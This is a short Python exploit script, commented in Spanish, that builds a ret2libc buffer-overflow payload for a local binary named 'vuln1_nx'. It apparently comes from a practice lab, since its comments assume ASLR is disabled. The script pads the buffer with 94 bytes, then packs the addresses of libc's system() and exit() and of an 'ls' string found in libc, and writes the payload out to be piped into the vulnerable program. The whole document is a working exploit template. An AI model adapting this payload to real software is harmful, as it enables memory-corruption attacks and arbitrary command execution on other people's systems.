# !/usr/bin/env python3
import struct
import sys

padding = 94 # Ajustar segun lo hallado

# (gdb) p system -> addr system
system_addr = 0xf7dba220

# offset de system() en la libc (objdump -T /lib32/libc.so.6 | grep system)
system_offset = 0x52220

libc_base = system_addr - system_offset # SOLO VALIDO PARA ASLR DESACTIVADO

# offset de exit() en la libc (objdump -T /lib32/libc.so.6 | grep exit)
exit_offset = 0x3ead0

# offset de "ls" en la libc -> addr "ls" - (system_addr - system_offset) 
# (gdb) find 0xf7d7c000, 0xf7f9a000, "ls" ->  addr "ls"
ls_offset = 0x17d37


payload = b"A" * padding
payload += struct.pack ( "<I" , libc_base + system_offset)
payload += struct.pack("<I", libc_base + exit_offset) 
payload += struct.pack ( "<I" , libc_base + ls_offset )

# python3 exploit.py | ./vuln1_nx
sys.stdout.buffer.write (payload)
